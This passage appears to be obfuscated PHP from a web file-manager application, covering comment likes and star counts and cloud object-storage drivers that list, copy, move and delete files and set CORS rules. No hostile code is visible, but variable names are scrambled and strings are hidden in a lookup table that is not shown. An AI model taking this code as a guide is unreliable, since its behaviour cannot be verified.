$ŸóÑÄñÈ[411] => $å¯£úØ, $ŸóÑÄñÈ[505] => $–‰”€ƒ, $ŸóÑÄñÈ[1884] => 0, $ŸóÑÄñÈ[1883] => 0); return $this->add($÷şìîãí); } public function starTargetCount($Ç²¤‚Ë÷, $Öô‘‰·) { $šƒ“šåå =& $_SERVER[³·—™¤¢]; $í€ŠÄ‚‹ = $Öô‘‰· + self::TYPE_STAR_OFFSET; $ÍŞ®Çáò = $this->commentCount($Ç²¤‚Ë÷, $í€ŠÄ‚‹); $ˆ¥¦ğÑğ = $this->commentCount($Ç²¤‚Ë÷, $í€ŠÄ‚‹, USER_ID); return array($šƒ“šåå[1886] => $ÍŞ®Çáò, $šƒ“šåå[1887] => $ˆ¥¦ğÑğ); } public function starTargetUserList($´ûÓàÔò, $”Å‘ÏÊ) { $İçî¦‡¯ =& $_SERVER[³·—™¤¢]; $ÜÑõÍæ = $´ûÓàÔò + self::TYPE_STAR_OFFSET; $æêæ°Ì = array($İçî¦‡¯[505] => $”Å‘ÏÊ, $İçî¦‡¯[411] => $ÜÑõÍæ); $ô©¹Åø = $this->where($æêæ°Ì)->count(); $êóªÍ†Õ = array($İçî¦‡¯[255] => $ô©¹Åø, $İçî¦‡¯[1888] => array()); if (!$ô©¹Åø) { return $êóªÍ†Õ; } $ñÙ³—·ë = $this->field($İçî¦‡¯[1680])->where($æêæ°Ì)->limit(500)->select(); $ñÙ³—·ë = array_to_keyvalue($ñÙ³—·ë, $İçî¦‡¯[12], $İçî¦‡¯[1680]); $êóªÍ†Õ[$İçî¦‡¯[1888]] = Model($İçî¦‡¯[513])->userListInfo($ñÙ³—·ë); return $êóªÍ†Õ; } public function prasiseUserList($„şù§Ù‹) { $©¢²ª†® =& $_SERVER[³·—™¤¢]; $“€ÂŒ©˜ = array($©¢²ª†®[1889] => $„şù§Ù‹); $Š¿ÒÜ = $this->where($“€ÂŒ©˜)->find(); $Á·Úã = _get($Š¿ÒÜ, $©¢²ª†®[1884], 0); $ŞÁÁ‰İÅ = array($©¢²ª†®[255] => $Á·Úã, $©¢²ª†®[1888] => array()); if (!$Á·Úã) { return $ŞÁÁ‰İÅ; } $”ÁçÒÈ = Model($©¢²ª†®[1890])->field($©¢²ª†®[1680])->where($“€ÂŒ©˜)->limit(500)->select(); $”ÁçÒÈ = array_to_keyvalue($”ÁçÒÈ, $©¢²ª†®[12], $©¢²ª†®[1680]); $ŞÁÁ‰İÅ[$©¢²ª†®[1888]] = Model($©¢²ª†®[513])->userListInfo($”ÁçÒÈ); return $ŞÁÁ‰İÅ; } public function remove($ã¾ÌÎ®) { $Ùëšò­ñ =& $_SERVER[³·—™¤¢]; $Í ÏÎµ = array($Ùëšò­ñ[1882] => $ã¾ÌÎ®); $õ«À¹…Š = $this->where($Í ÏÎµ)->find(); if ($õ«À¹…Š[$Ùëšò­ñ[1881]]) { $this->where(array($Ùëšò­ñ[1882] => $õ«À¹…Š[$Ùëšò­ñ[1881]]))->setAdd($Ùëšò­ñ[1883], -1); } return $this->where($Í ÏÎµ)->delete(); } public function edit($€‘¸µïÚ, $÷”ëƒù¨) { $µ ¢µ˜É =& $_SERVER[³·—™¤¢]; $¦“áé‘Õ = array($µ ¢µ˜É[1882] => $€‘¸µïÚ); return $this->where($¦“áé‘Õ)->save(array($µ ¢µ˜É[1891] => $÷”ëƒù¨)); } public function prasise($âƒïî¿) { $±‚’Ãõ¢ =& $_SERVER[³·—™¤¢]; $¯Éîé£ = Model($±‚’Ãõ¢[1892]); $Ø¨›ì‰Õ = array($±‚’Ãõ¢[1882] => $âƒïî¿, $±‚’Ãõ¢[1671] => USER_ID); $ÉÔšŞŞ = $¯Éîé£->where($Ø¨›ì‰Õ)->find(); if (!$ÉÔšŞŞ) { $¯Éîé£->add($Ø¨›ì‰Õ); $…Õ›…“ = $this->where(array($±‚’Ãõ¢[1882] => $âƒïî¿))->setAdd($±‚’Ãõ¢[1884], 1); } else { $¯Éîé£->where($Ø¨›ì‰Õ)->delete(); $…Õ›…“ = $this->where(array($±‚’Ãõ¢[1882] => $âƒïî¿))->setAdd($±‚’Ãõ¢[1884], -1); } return $…Õ›…“; } public function targetInfo($¾î¦–Ò°, $ü“Ğ¨Â¶) { $¤¥¬Â‘Í =& $_SERVER[³·—™¤¢]; $½à‚‘Ë¹ = array($¤¥¬Â‘Í[586] => $¾î¦–Ò°, $¤¥¬Â‘Í[587] => $ü“Ğ¨Â¶); $¯ïãµ÷ş = $this->where($½à‚‘Ë¹)->count(); $ñõ·’œÁ = "\x52\x49\x47\x48\x54\40\112\117\111\x4e\40{$this->tablePrefix}\143\x6f\155\x6d\x65\x6e\x74\137\x70\x72\x61\151\163\x65\x20\163\x74\x61\x72\40\157\156\40\143\157\x6d\x6d\x65\x6e\164\x2e\x63\157\155\x6d\x65\156\x74\111\x44\40\x3d\x20\x73\164\141\x72\56\x63\157\x6d\155\x65\156\164\111\x44"; $ê¼Ïåô„ = $this->alias($¤¥¬Â‘Í[354])->where($½à‚‘Ë¹)->join($ñõ·’œÁ, $¤¥¬Â‘Í[1893])->count(); $Á¹ûÒŒ½ = array($¤¥¬Â‘Í[1894] => $¯ïãµ÷ş, $¤¥¬Â‘Í[1895] => $ê¼Ïåô„); return $Á¹ûÒŒ½; } public function listData($îÇó€É¶) { $’´çûò¶ =& $_SERVER[³·—™¤¢]; if (isset($îÇó€É¶[$’´çûò¶[1896]])) { if ($îÇó€É¶[$’´çûò¶[1896]]) { $îÇó€É¶[$’´çûò¶[1889]] = array($’´çûò¶[1037], intval($îÇó€É¶[$’´çûò¶[1896]])); } unset($îÇó€É¶[$’´çûò¶[1896]]); } if (isset($îÇó€É¶[$’´çûò¶[1897]])) { if ($îÇó€É¶[$’´çûò¶[1897]]) { $îÇó€É¶[$’´çûò¶[1889]] = array($’´çûò¶[1034], intval($îÇó€É¶[$’´çûò¶[1897]])); } unset($îÇó€É¶[$’´çûò¶[1897]]); } return $this->_listData($îÇó€É¶); } private function _listData($ÈéÍŠÌÁ) { $Ÿ±ñÓ„´ =& $_SERVER[³·—™¤¢]; $ò“à¹‹á = $this->where($ÈéÍŠÌÁ)->_makeOrder()->selectPage(100); $this->_listAppendParent($ò“à¹‹á[$Ÿ±ñÓ„´[369]]); $this->_listAppendUser($ò“à¹‹á[$Ÿ±ñÓ„´[369]]); $this->_listAppendMeta($ò“à¹‹á[$Ÿ±ñÓ„´[369]]); return $ò“à¹‹á; } private function _makeOrder() { $á‚ëå¬™ =& $_SERVER[³·—™¤¢]; $±Š“ş“ã = array($á‚ëå¬™[1884], $á‚ëå¬™[1883], $á‚ëå¬™[200]); $¶¨¿¯í = Input::get($á‚ëå¬™[457], $á‚ëå¬™[7], $á‚ëå¬™[423], $±Š“ş“ã); $ûÇû¶‰ = Input::get($á‚ëå¬™[458], $á‚ëå¬™[7], $á‚ëå¬™[1673], array($á‚ëå¬™[1898], $á‚ëå¬™[453])); $ÄŠÙŒ‚ã = $¶¨¿¯í . $á‚ëå¬™[53] . $ûÇû¶‰; return $this->order($ÄŠÙŒ‚ã); } private function _listAppendParent(&$Ï¼ê‘ÍÑ) { $£²Şá½Ö =& $_SERVER[³·—™¤¢]; $ßÓ˜üÈ = array_unique(array_to_keyvalue($Ï¼ê‘ÍÑ, $£²Şá½Ö[12], $£²Şá½Ö[1881])); $ßÓ˜üÈ = array_remove_value($ßÓ˜üÈ, $£²Şá½Ö[197]); if (!$ßÓ˜üÈ) { return; } $šøğµóû = $this->where(array($£²Şá½Ö[1882] => array($£²Şá½Ö[7], $ßÓ˜üÈ)))->select(); $šøğµóû = array_to_keyvalue($šøğµóû, $£²Şá½Ö[1889]); foreach ($Ï¼ê‘ÍÑ as &$‰Ê Ä›) { if (isset($šøğµóû[$‰Ê Ä›[$£²Şá½Ö[1881]]])) { $‰Ê Ä›[$£²Şá½Ö[1899]] = $šøğµóû[$‰Ê Ä›[$£²Şá½Ö[1881]]]; } } unset($‰Ê Ä›); } private function _listAppendUser(&$½Ë‰Œ‡é) { $ÆÑŞÌÙ‡ =& $_SERVER[³·—™¤¢]; $¦À¡èÈµ = array_unique(array_to_keyvalue($½Ë‰Œ‡é, $ÆÑŞÌÙ‡[12], $ÆÑŞÌÙ‡[1680])); $¦À¡èÈµ = array_remove_value($¦À¡èÈµ, $ÆÑŞÌÙ‡[197]); if (count($¦À¡èÈµ) == 0) { return; } foreach ($½Ë‰Œ‡é as $­¼ŸÔ) { if (isset($­¼ŸÔ[$ÆÑŞÌÙ‡[1899]])) { $¦À¡èÈµ[] = $­¼ŸÔ[$ÆÑŞÌÙ‡[1899]][$ÆÑŞÌÙ‡[1680]]; } } $Ô½®’ªì = Model($ÆÑŞÌÙ‡[535])->userListInfo($¦À¡èÈµ); foreach ($½Ë‰Œ‡é as &$­¼ŸÔ) { $­¼ŸÔ[$ÆÑŞÌÙ‡[600]] = $Ô½®’ªì[$­¼ŸÔ[$ÆÑŞÌÙ‡[1680]]]; if (isset($­¼ŸÔ[$ÆÑŞÌÙ‡[1899]])) { $­¼ŸÔ[$ÆÑŞÌÙ‡[1899]][$ÆÑŞÌÙ‡[600]] = $Ô½®’ªì[$­¼ŸÔ[$ÆÑŞÌÙ‡[1899]][$ÆÑŞÌÙ‡[1680]]]; } } unset($­¼ŸÔ); } private function _listAppendMeta(&$º¾¡Ÿ™Å) { $œûù“éî =& $_SERVER[³·—™¤¢]; $ÒãĞ¬Á— = array_unique(array_to_keyvalue($º¾¡Ÿ™Å, $œûù“éî[12], $œûù“éî[1889])); $ÒãĞ¬Á— = array_remove_value($ÒãĞ¬Á—, $œûù“éî[197]); if (!$ÒãĞ¬Á—) { return; } foreach ($º¾¡Ÿ™Å as $ÍÉæåÀ) { if (isset($ÍÉæåÀ[$œûù“éî[1899]])) { $ÒãĞ¬Á—[] = $ÍÉæåÀ[$œûù“éî[1899]][$œûù“éî[1889]]; } } $Şñ­á¢¦ = $this->metaList($ÒãĞ¬Á—); if (!$Şñ­á¢¦) { return !1; } foreach ($º¾¡Ÿ™Å as &$ÍÉæåÀ) { $ÍÉæåÀ[$œûù“éî[466]] = $Şñ­á¢¦[$ÍÉæåÀ[$œûù“éî[1889]]]; if (isset($ÍÉæåÀ[$œûù“éî[1899]])) { $ÍÉæåÀ[$œûù“éî[1899]][$œûù“éî[466]] = $Şñ­á¢¦[$ÍÉæåÀ[$œûù“éî[1899]][$œûù“éî[1889]]]; } } unset($ÍÉæåÀ); } private function metaList($ß·£¦é) { $Æ”Ñöì =& $_SERVER[³·—™¤¢]; if (!$ß·£¦é) { return array(); } $·ƒÅÄ©½ = array($Æ”Ñöì[1889] => array($Æ”Ñöì[7], $ß·£¦é)); $š–î°¦™ = Model($Æ”Ñöì[1900])->where($·ƒÅÄ©½)->select(); $š–î°¦™ = array_to_keyvalue_group($š–î°¦™, $Æ”Ñöì[1889]); foreach ($š–î°¦™ as $Ä¸ùÔ½ => $ÆÍŒôøß) { $àÏÑÌ¯É = array(); foreach ($ÆÍŒôøß as $åÚÇé–ú) { $àÏÑÌ¯É[$åÚÇé–ú[$Æ”Ñöì[94]]] = $åÚÇé–ú[$Æ”Ñöì[374]]; } $š–î°¦™[$Ä¸ùÔ½] = $àÏÑÌ¯É; } return $š–î°¦™ ? $š–î°¦™ : array(); } } goto B¸×‡…èÂÖ; CÀŸéùãÂ: define($_SERVER[³·—™¤¢][241], 1); define($_SERVER[³·—™¤¢][242], 0); define($_SERVER[³·—™¤¢][243], 2); goto dŒĞÌ‚Ş; a‚ÕŒ¹…¥ƒ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Õ„Æ¾æ) { parent::__construct($Õ„Æ¾æ); $this->signatureVersion($_SERVER[³·—™¤¢][216]); } public function fileOutLink($âñÃî€“) { $¥ğ­¾ÜÙ =& $_SERVER[³·—™¤¢]; if (substr($âñÃî€“, 0, 7) == $¥ğ­¾ÜÙ[1348]) { $âñÃî€“ = $¥ğ­¾ÜÙ[1349] . substr($âñÃî€“, 7); } header($¥ğ­¾ÜÙ[161] . $âñÃî€“); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($¢ú•šš›) { parent::__construct(); include_once SDK_DIR . $_SERVER[³·—™¤¢][1405]; $this->_init($¢ú•šš›); } public function _init($½öíßØ) { $ÊÆı“Ñ“ =& $_SERVER[³·—™¤¢]; foreach ($½öíßØ as $Æ’šˆ‡ => $Ë Ó­œ) { if (isset($this->{$Æ’šˆ‡})) { $this->{$Æ’šˆ‡} = $Ë Ó­œ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÊÆı“Ñ“[1406] . LNG($ÊÆı“Ñ“[1407])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $»¶½İç¾ =& $_SERVER[³·—™¤¢]; $—›õÜØÃ = new OSS\Model\CorsConfig(); $” Øû”¯ = new OSS\Model\CorsRule(); $” Øû”¯->addAllowedOrigin($»¶½İç¾[1408]); $” Øû”¯->addAllowedMethod($»¶½İç¾[1409]); $” Øû”¯->addAllowedMethod($»¶½İç¾[1410]); $” Øû”¯->addAllowedMethod($»¶½İç¾[1411]); $” Øû”¯->addAllowedMethod($»¶½İç¾[1412]); $” Øû”¯->addAllowedMethod($»¶½İç¾[160]); $” Øû”¯->setMaxAgeSeconds(600); $” Øû”¯->addExposeHeader($»¶½İç¾[1413]); $” Øû”¯->addAllowedHeader($»¶½İç¾[1408]); $—›õÜØÃ->addRule($” Øû”¯); try { $this->client->putBucketCors($this->bucket, $—›õÜØÃ); } catch (OSS\Core\OssException $è™áêú) { return !1; } return !0; } public function getBucketCors() { $³Œˆ˜øÌ =& $_SERVER[³·—™¤¢]; $Ú¶ÆïµÙ = null; try { $Ú¶ÆïµÙ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $’ùöô¼) { return null; } if (!$Ú¶ÆïµÙ || !($äÏ­Ê«£ = $Ú¶ÆïµÙ->getRules())) { return null; } $×ÚÇ²è½ = $äÏ­Ê«£[0]->getAllowedOrigins(); $İÁªÇŒ = $äÏ­Ê«£[0]->getAllowedMethods(); $î“æÛú£ = $äÏ­Ê«£[0]->getMaxAgeSeconds(); $áŒ¿Ş‰ = $äÏ­Ê«£[0]->getExposeHeaders(); $ßöîÙïÓ = $äÏ­Ê«£[0]->getAllowedHeaders(); return array($³Œˆ˜øÌ[187] => isset($×ÚÇ²è½[0]) ? $×ÚÇ²è½[0] : $³Œˆ˜øÌ[12], $³Œˆ˜øÌ[191] => $İÁªÇŒ, $³Œˆ˜øÌ[1414] => $î“æÛú£, $³Œˆ˜øÌ[1415] => isset($áŒ¿Ş‰[0]) ? $áŒ¿Ş‰[0] : $³Œˆ˜øÌ[12], $³Œˆ˜øÌ[189] => isset($ßöîÙïÓ[0]) ? $ßöîÙïÓ[0] : $³Œˆ˜øÌ[12]); } public function isBucketCors() { $ÒÛ¯…„© =& $_SERVER[³·—™¤¢]; $æ´…Ğ¯Ÿ = $this->getBucketCors(); if (!$æ´…Ğ¯Ÿ || !is_array($æ´…Ğ¯Ÿ)) { return !1; } if ($æ´…Ğ¯Ÿ[$ÒÛ¯…„©[187]] != $ÒÛ¯…„©[188] || $æ´…Ğ¯Ÿ[$ÒÛ¯…„©[189]] != $ÒÛ¯…„©[188]) { return !1; } $Éê¯¸Ã„ = array_map($ÒÛ¯…„©[190], $æ´…Ğ¯Ÿ[$ÒÛ¯…„©[191]]); if (!is_array($Éê¯¸Ã„)) { $Éê¯¸Ã„ = array(); } $¸ÂòÒ¨¥ = array($ÒÛ¯…„©[192], $ÒÛ¯…„©[193], $ÒÛ¯…„©[194], $ÒÛ¯…„©[195], $ÒÛ¯…„©[196]); $ÌÎÀø«æ = array_diff($¸ÂòÒ¨¥, $Éê¯¸Ã„); return empty($ÌÎÀø«æ); } public function mkfile($ô™ÔçİÀ, $€êó´Å• = '', $ü˜ø·ñ = REPEAT_RENAME) { $À±ÅÑê˜ = $this->setContent($ô™ÔçİÀ, $€êó´Å•); if ($À±ÅÑê˜ !== !1) { return $this->getPathOuter($ô™ÔçİÀ); } return !1; } public function mkdir($ß´ãà¿Å, $ îŒúà = REPEAT_SKIP) { if ($ îŒúà && $this->_isFolder($ß´ãà¿Å)) { return $this->getPathOuter($ß´ãà¿Å); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ß´ãà¿Å)); } catch (OSS\Core\OssException $ú´ğü‰•) { return !1; } return $this->getPathOuter($ß´ãà¿Å); } private function fileList($×’Œ¢Çõ, $¸ü–¤æ¹ = '', $‘Ùïİ—İ = 0) { $şúŒ«¢Ê =& $_SERVER[³·—™¤¢]; $×’Œ¢Çõ = trim($×’Œ¢Çõ, $şúŒ«¢Ê[8]); $âîÄÏîÍ = empty($×’Œ¢Çõ) && $×’Œ¢Çõ !== $şúŒ«¢Ê[197] ? $şúŒ«¢Ê[12] : $×’Œ¢Çõ . $şúŒ«¢Ê[8]; $ã€¬·Ü = $şúŒ«¢Ê[12]; $‚ÁƒÂ¡ê = 1000; $òù¡÷çË = $…¨¥¥Ô• = array(); while (!0) { check_abort(); $˜¾ÁÌœÊ = array($şúŒ«¢Ê[1416] => $¸ü–¤æ¹, $şúŒ«¢Ê[1417] => $âîÄÏîÍ, $şúŒ«¢Ê[1418] => $‚ÁƒÂ¡ê, $şúŒ«¢Ê[1419] => $ã€¬·Ü); try { $¶¯ğîøÇ = $this->client->listObjects($this->bucket, $˜¾ÁÌœÊ); } catch (OSS\Core\OssException $±ÁµèÛÕ) { break; } $ã€¬·Ü = $¶¯ğîøÇ->getNextMarker(); $Úòçµ—ò = $¶¯ğîøÇ->getObjectList(); $ ²àÖ‚± = $¶¯ğîøÇ->getPrefixList(); foreach ($Úòçµ—ò as $ŠøÅ˜ó÷) { if ($ŠøÅ˜ó÷->getKey() == $âîÄÏîÍ) { continue; } $Ö¨İÃ— = $ŠøÅ˜ó÷->getKey(); $¨úÜ»¢è = $ŠøÅ˜ó÷->getSize(); $Õ‡›ÁıĞ = $ŠøÅ˜ó÷->getLastModified(); $²øœÒà† = $‘Ùïİ—İ ? array($şúŒ«¢Ê[32] => $Ö¨İÃ—, $şúŒ«¢Ê[76] => $¨úÜ»¢è, $şúŒ«¢Ê[203] => strtotime($Õ‡›ÁıĞ)) : $Ö¨İÃ—; $Ğ€ƒµÉµ = $¨úÜ»¢è == 0 && substr($Ö¨İÃ—, strlen($Ö¨İÃ—) - 1, 1) == $şúŒ«¢Ê[8] ? !0 : !1; $Ÿ–å•Ü = array($şúŒ«¢Ê[76] => $¨úÜ»¢è, $şúŒ«¢Ê[1420] => $¨úÜ»¢è, $şúŒ«¢Ê[85] => strtotime($Õ‡›ÁıĞ), $şúŒ«¢Ê[1421] => $Õ‡›ÁıĞ); $this->cacheMethodInfoSet($Ö¨İÃ—, $Ğ€ƒµÉµ, $Ÿ–å•Ü); if ($Ğ€ƒµÉµ) { $òù¡÷çË[] = $Ö¨İÃ—; continue; } $…¨¥¥Ô•[] = $²øœÒà†; } foreach ($ ²àÖ‚± as $’¦ˆœì) { $òù¡÷çË[] = $’¦ˆœì->getPrefix(); $this->cacheMethodInfoSet($’¦ˆœì->getPrefix(), !0); } if ($ã€¬·Ü === $şúŒ«¢Ê[12]) { break; } } $this->cacheMethodInfoSet($×’Œ¢Çõ, !0); return array($şúŒ«¢Ê[82] => $òù¡÷çË, $şúŒ«¢Ê[83] => $…¨¥¥Ô•); } public function copyFile($±˜íÏıÅ, $Ú±Á¨åÑ) { $¢‚ÄÔÓ = $this->size($±˜íÏıÅ); if ($¢‚ÄÔÓ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $±˜íÏıÅ, $this->bucket, $this->pathEncode($Ú±Á¨åÑ)); } catch (OSS\Core\OssException $•ùÜÖ) { return !1; } return $this->getPathOuter($Ú±Á¨åÑ); } $œ™ØÄşº = $this->multiCopyObject($±˜íÏıÅ, $Ú±Á¨åÑ, $¢‚ÄÔÓ); return $œ™ØÄşº ? $this->getPathOuter($Ú±Á¨åÑ) : !1; } private function multiCopyObject($“äÃ¸¤, $ûİµÑĞë, $‡²àÙ´) { $öËîÃ³ =& $_SERVER[³·—™¤¢]; try { $›ô”ìõı = array(); if ($Û•ÈÂ¤– = $this->hashMd5($“äÃ¸¤)) { $›ô”ìõı = array(OSS\OssClient::OSS_HEADERS => array($öËîÃ³[1422] => $Û•ÈÂ¤–)); } $úò“¦¤ı = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ûİµÑĞë), $›ô”ìõı); $Û™Çªİí = 1; $„˜Ñ¿‹± = 0; $šõƒ°Ä = array(); $œÑ“È‚× = 1024 * 1024 * 10; $ÓÖ†ÜÃ = $this->client->generateMultiuploadParts($‡²àÙ´, $œÑ“È‚×); foreach ($ÓÖ†ÜÃ as $“ÔÍ§²— => $Ú­¼ÎÎ) { $Ù÷´áºˆ = $„˜Ñ¿‹± + (int) $Ú­¼ÎÎ[$öËîÃ³[1423]]; $ÄßÕ”Ÿ† = (int) $Ú­¼ÎÎ[$öËîÃ³[337]] + $Ù÷´áºˆ - 1; $†¶şé„ß = array($öËîÃ³[1424] => $Ù÷´áºˆ, $öËîÃ³[1425] => $ÄßÕ”Ÿ†); $šõƒ°Ä[] = $this->client->uploadPartCopy($this->bucket, $“äÃ¸¤, $this->bucket, $this->pathEncode($ûİµÑĞë), $Û™Çªİí, $úò“¦¤ı, $†¶şé„ß); $Û™Çªİí = $Û™Çªİí + 1; } $ˆ§ÒÜ½ = array(); foreach ($šõƒ°Ä as $“ÔÍ§²— => $¡ïêÄ¾) { $ˆ§ÒÜ½[] = array($öËîÃ³[1426] => $“ÔÍ§²— + 1, $öËîÃ³[1427] => $¡ïêÄ¾); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ûİµÑĞë), $úò“¦¤ı, $ˆ§ÒÜ½); } catch (OSS\Core\OssException $Îš•šÒµ) { return !1; } return !0; } public function moveFile($Úé£ÔïŞ, $—»ıêıù) { if ($this->copyFile($Úé£ÔïŞ, $—»ıêıù)) { $this->remove($Úé£ÔïŞ); return $this->getPathOuter($—»ıêıù); } return !1; } public function delFile($”÷ßš«) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($”÷ßš«)); } catch (OSS\Core\OssException $…²’ùÊ) { return !1; } return !0; } public function delFolder($‹İ ƒ×) { $Êü¿øœÄ =& $_SERVER[³·—™¤¢]; if (!$this->exist($‹İ ƒ×)) { return !0; } $this->listItemCache = !1; $×¦¹–â¤ = $this->fileList($‹İ ƒ×); $this->listItemCache = !0; $˜¬ˆßÈ = trim($‹İ ƒ×, $Êü¿øœÄ[8]) . $Êü¿øœÄ[8]; if (!empty($‹İ ƒ×) && $‹İ ƒ× !== $Êü¿øœÄ[197] && !in_array($˜¬ˆßÈ, $×¦¹–â¤[$Êü¿øœÄ[82]])) { $×¦¹–â¤[$Êü¿øœÄ[82]][] = $˜¬ˆßÈ; } $¬éÓ”²÷ = $this->delByBatch($×¦¹–â¤[$Êü¿øœÄ[83]]); if (!$¬éÓ”²÷) { return !1; } $¬éÓ”²÷ = $this->delByBatch($×¦¹–â¤[$Êü¿øœÄ[82]]); if (!$¬éÓ”²÷) { return !1; } return $this->delFile($˜¬ˆßÈ); } private function delByBatch($¶÷‚¾Ú¾) { foreach (array_chunk($¶÷‚¾Ú¾, 1000) as $¶®Î³™¤) { try { $this->client->deleteObjects($this->bucket, $¶®Î³™¤); } catch (OSS\Core\OssException $˜óé©¶) { return !1; } } return !0; } public function rename($İÄ‰×æ, $õºéòğò) { return $this->renameObject($İÄ‰×æ, $õºéòğò); } private function fileInfo($ß›Öª«Ÿ, $Í¢íßµ© = false, $ã§ç£ìç = array()) { $µ»½¦ÊÜ =& $_SERVER[³·—™¤¢]; $óíÍµ© = array($µ»½¦ÊÜ[32] => $this->pathThis($ß›Öª«Ÿ), $µ»½¦ÊÜ[84] => $this->getPathOuter($ß›Öª«Ÿ), $µ»½¦ÊÜ[33] => $µ»½¦ÊÜ[199], $µ»½¦ÊÜ[76] => isset($ã§ç£ìç[$µ»½¦ÊÜ[76]]) ? $ã§ç£ìç[$µ»½¦ÊÜ[76]] : 0, $µ»½¦ÊÜ[174] => $this->ext($ß›Öª«Ÿ)); if ($Í¢íßµ©) { return $óíÍµ©; } $óíÍµ©[$µ»½¦ÊÜ[200]] = $óíÍµ©[$µ»½¦ÊÜ[85]] = 0; $óíÍµ©[$µ»½¦ÊÜ[201]] = $óíÍµ©[$µ»½¦ÊÜ[202]] = !0; if (empty($ã§ç£ìç)) { $Ç¶¡¹Áœ = $this->objectMeta($ß›Öª«Ÿ); if (!$Ç¶¡¹Áœ) { return $óíÍµ©; } $ã§ç£ìç = array($µ»½¦ÊÜ[85] => strtotime($Ç¶¡¹Áœ[$µ»½¦ÊÜ[1421]]), $µ»½¦ÊÜ[76] => $Ç¶¡¹Áœ[$µ»½¦ÊÜ[1420]] + 0); } if (isset($ã§ç£ìç[$µ»½¦ÊÜ[76]])) { $óíÍµ©[$µ»½¦ÊÜ[76]] = $ã§ç£ìç[$µ»½¦ÊÜ[76]]; } if (isset($ã§ç£ìç[$µ»½¦ÊÜ[85]])) { $óíÍµ©[$µ»½¦ÊÜ[85]] = $ã§ç£ìç[$µ»½¦ÊÜ[85]]; } if (isset($ã§ç£ìç[$µ»½¦ÊÜ[203]]) && !trim($óíÍµ©[$µ»½¦ÊÜ[85]])) { $óíÍµ©[$µ»½¦ÊÜ[85]] = $ã§ç£ìç[$µ»½¦ÊÜ[203]]; } return $óíÍµ©; } private function folderInfo($ıŞ‰½ûÏ, $ÜÃŒ¨‹š = false, $÷Ùê½Ñ = array()) { $ëØä„ =& $_SERVER[³·—™¤¢]; $Èïõü…÷ = array($ëØä„[32] => $this->pathThis($ıŞ‰½ûÏ), $ëØä„[84] => $this->getPathOuter($ëØä„[8] . $ıŞ‰½ûÏ), $ëØä„[33] => $ëØä„[75]); if ($ÜÃŒ¨‹š) { return $Èïõü…÷; } $Èïõü…÷[$ëØä„[200]] = $Èïõü…÷[$ëØä„[85]] = 0; $Èïõü…÷[$ëØä„[201]] = $Èïõü…÷[$ëØä„[202]] = !0; if (empty($÷Ùê½Ñ)) { $ıŞ‰½ûÏ = rtrim($ıŞ‰½ûÏ, $ëØä„[8]) . $ëØä„[8]; $ÏÏ»ìİÛ = $this->objectMeta($ıŞ‰½ûÏ); if (!$ÏÏ»ìİÛ) { return $Èïõü…÷; } $÷Ùê½Ñ = array($ëØä„[200] => $ÏÏ»ìİÛ[$ëØä„[511]][$ëØä„[1428]], $ëØä„[85] => strtotime($ÏÏ»ìİÛ[$ëØä„[1421]])); } if (isset($÷Ùê½Ñ[$ëØä„[85]])) { $Èïõü…÷[$ëØä„[85]] = $÷Ùê½Ñ[$ëØä„[85]]; } if (isset($÷Ùê½Ñ[$ëØä„[200]])) { $Èïõü…÷[$ëØä„[200]] = $÷Ùê½Ñ[$ëØä„[200]]; } return $Èïõü…÷; } public function listPath($Íñ¹ó¬…, $úÌï§Œ• = false) { $û®˜àı‰ =& $_SERVER[³·—™¤¢]; $²ÆüÄæé = $this->fileList($Íñ¹ó¬…, $û®˜àı‰[8], !0); foreach ($²ÆüÄæé[$û®˜àı‰[82]] as $õ¸ªÊßÏ => $±¿ë’Ã…) { $²ÆüÄæé[$û®˜àı‰[82]][$õ¸ªÊßÏ] = $this->folderInfo($±¿ë’Ã…, $úÌï§Œ•, $±¿ë’Ã…); } foreach ($²ÆüÄæé[$û®˜àı‰[83]] as $õ¸ªÊßÏ => $±¿ë’Ã…) { $²ÆüÄæé[$û®˜àı‰[83]][$õ¸ªÊßÏ] = $this->fileInfo($±¿ë’Ã…[$û®˜àı‰[32]], $úÌï§Œ•, $±¿ë’Ã…); } return $²ÆüÄæé; } protected function infoChildren($Êˆ‰¢Ğ, &$¸£Ğí«) { $ìÖ©îƒ =& $_SERVER[³·—™¤¢]; $§æ¿› = $this->fileList($Êˆ‰¢Ğ, $ìÖ©îƒ[12], !0); $¸£Ğí«[$ìÖ©îƒ[78]] += count($§æ¿›[$ìÖ©îƒ[82]]); $¸£Ğí«[$ìÖ©îƒ[77]] += count($§æ¿›[$ìÖ©îƒ[83]]); foreach ($§æ¿›[$ìÖ©îƒ[83]] as $´í‹¾ë) { if (!$´í‹¾ë || !$´í‹¾ë[$ìÖ©îƒ[76]]) { continue; } $¸£Ğí«[$ìÖ©îƒ[76]] += $´í‹¾ë[$ìÖ©îƒ[76]]; } } public function has($ °““°¼, $Ñ¶‘š¸€ = false, $¤œÅ¤ò… = true) { $»øğ¹³ =& $_SERVER[³·—™¤¢]; $ °““°¼ = trim($ °““°¼, $»øğ¹³[8]); $Ê°û™íÄ = empty($ °““°¼) && $ °““°¼ !== $»øğ¹³[197] ? $»øğ¹³[12] : $ °““°¼ . $»øğ¹³[8]; $ã³’Ÿ¯Œ = $»øğ¹³[12]; $–ÈÓèÓ¦ = 500; $á«Öğ¢ = $´Ÿşåã· = 0; while (!0) { check_abort(); $ºŒƒº = array($»øğ¹³[1416] => $»øğ¹³[8], $»øğ¹³[1417] => $Ê°û™íÄ, $»øğ¹³[1418] => $–ÈÓèÓ¦, $»øğ¹³[1419] => $ã³’Ÿ¯Œ); try { $®Ú™äé« = $this->client->listObjects($this->bucket, $ºŒƒº); } catch (OSS\Core\OssException $Óäøë†) { break; } $ã³’Ÿ¯Œ = $®Ú™äé«->getNextMarker(); $ŠçéÈ®³ 